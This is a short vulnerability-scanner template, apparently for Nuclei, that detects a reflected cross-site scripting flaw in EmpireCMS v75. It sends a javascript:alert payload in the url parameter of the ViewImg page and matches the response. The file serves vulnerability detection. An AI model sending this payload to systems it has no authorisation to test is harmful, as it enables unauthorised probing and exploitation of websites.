id: empirecms-xss

info:
  name: EmpireCMS v75 XSS
  author: pikpikcu
  severity: medium
  reference: https://www.geek-share.com/detail/2777280260.html
  tags: empirecms,xss


requests:
  - method: GET
    path:
      - "{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(/1337/)"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - 'onmousewheel=\"return bbimg(this)\"'
        condition: and

      - type: status
        status:
          - 200
